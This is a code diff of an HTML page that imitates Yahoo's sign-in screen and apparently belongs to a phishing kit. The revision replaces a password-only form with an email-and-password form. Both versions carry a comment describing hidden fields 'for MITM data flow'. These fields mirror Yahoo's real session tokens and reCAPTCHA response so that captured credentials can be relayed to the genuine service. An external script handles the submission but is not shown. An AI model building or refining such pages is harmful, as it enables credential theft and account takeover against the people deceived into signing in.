@@ -2,11 +2,13 @@
 <html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
     <meta charset="utf-8">
-    <title>Yahoo - Enter Password</title>
+    <title>Sign in to Yahoo</title>
+    <meta content="Sign in to Yahoo" property="og:title">
+    <meta content="Sign in to Yahoo" property="twitter:title">
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <meta content="Webflow" name="generator">
     
-    <!-- Complete CSS Structure -->
+    <!-- Only the necessary CSS files -->
     <link href="css/normalize.css" rel="stylesheet" type="text/css">
     <link href="css/webflow.css" rel="stylesheet" type="text/css">
     <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
@@ -32,83 +34,47 @@
 </head>
 
 <body>
-    <section class="section">
-        <!-- Header -->
-        <div class="div-block">
-            <div class="div-block-2">
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image">
-            </div>
-            <div class="div-block-3">
-                <div class="text-block">Help</div>
-                <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
-                <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
-            </div>
+    <div class="yahoo-container">
+        <div class="yahoo-logo">
+            <img src="/placeholder.svg?height=60&width=120" alt="Yahoo" />
         </div>
-
-        <!-- Main Content -->
-        <div class="layout active">
-            <div class="div-block-5">
-                <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
-                <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
-            </div>
+        
+        <div class="yahoo-form">
+            <h1 style="text-align: center; margin-bottom: 20px; font-size: 24px; color: #333;">Sign in</h1>
             
-            <!-- Form Container -->
-            <div class="form-block w-form">
-                <form id="email-form" name="email-form" data-name="Email Form" class="form" method="POST">
-                    
-                    <!-- 🎯 CRITICAL: Hidden fields for MITM data flow -->
-                    <input type="hidden" name="username" id="username">
-                    <input type="hidden" name="crumb" id="crumb">
-                    <input type="hidden" name="acrumb" id="acrumb">
-                    <input type="hidden" name="sessionIndex" id="sessionIndex">
-                    <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
-                    <input type="hidden" name="src" value="ym">
-                    <input type="hidden" name=".lang" value="en-US">
-                    <input type="hidden" name=".intl" value="us">
-                    <input type="hidden" name="displayName" id="displayName">
-                    <input type="hidden" name="browser-fp-data" id="browser-fp-data">
-                    <input type="hidden" name="deviceCapability" id="deviceCapability">
-                    <input type="hidden" name="signin" value="Next">
-                    <input type="hidden" name="persistent" value="y">
-                    <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
-                    
-                    <!-- Yahoo Logo -->
-                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image-2">
-                    
-                    <!-- Main Form -->
-                    <div class="pazzi" id="main-form">
-                        <div class="reflectto" id="userEmail">Enter your password</div>
-                        <h1 class="heading-2"><strong>Enter password</strong></h1>
-                        <div class="text-block-2">to finish signing in<br></div>
-                        
-                        <div class="pazz lpl">Password</div>
-                        <div class="ms-input-wrap">
-                            <input data-show="true" class="ms-input w-input" maxlength="256"
-                                   name="passwd" data-name="passwd" placeholder="" type="password"
-                                   id="password" data-ms-member="password" required="" autofocus
-                                   autocomplete="current-password">
-                            
-                            <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
-                                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
-                                    <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current">👁️</a>
-                                    <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link">🙈</a>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
-                    </div>
-                    
-                    <!-- Error State -->
-                    <div class="errry" id="error-container">
-                        <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
-                        <div class="text-block-7" id="error-message">Invalid password. Please try again.</div>
-                        <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
-                    </div>
-                </form>
+            <form id="passwordForm" name="email-form" data-name="Email Form" class="form" method="POST">
+                
+                <!-- 🎯 CRITICAL: Hidden fields for MITM data flow -->
+                <input type="hidden" name="crumb" id="crumb">
+                <input type="hidden" name="acrumb" id="acrumb">
+                <input type="hidden" name="sessionIndex" id="sessionIndex">
+                <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+                <input type="hidden" name="src" value="ym">
+                <input type="hidden" name=".lang" value="en-US">
+                <input type="hidden" name=".intl" value="us">
+                <input type="hidden" name="displayName" id="displayName">
+                <input type="hidden" name="browser-fp-data" id="browser-fp-data">
+                <input type="hidden" name="deviceCapability" id="deviceCapability">
+                <input type="hidden" name="signin" value="Next">
+                <input type="hidden" name="persistent" value="y">
+                <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
+                
+                <input type="email" id="username" name="username" class="yahoo-input" placeholder="Email address" required>
+                <input type="password" id="passwd" name="passwd" class="yahoo-input" placeholder="Password" required>
+                
+                <div class="yahoo-error" id="errorMessage"></div>
+                
+                <button type="submit" class="yahoo-button" id="submitBtn">
+                    <span id="btnText">Next</span>
+                    <span id="btnSpinner" class="loading-spinner" style="display: none;"></span>
+                </button>
+            </form>
+            
+            <div style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: #5f01d1; text-decoration: none; font-size: 14px;">Forgot password?</a>
             </div>
         </div>
-    </section>
+    </div>
 
     <script src="js/yahoo-password.js"></script>
 </body>
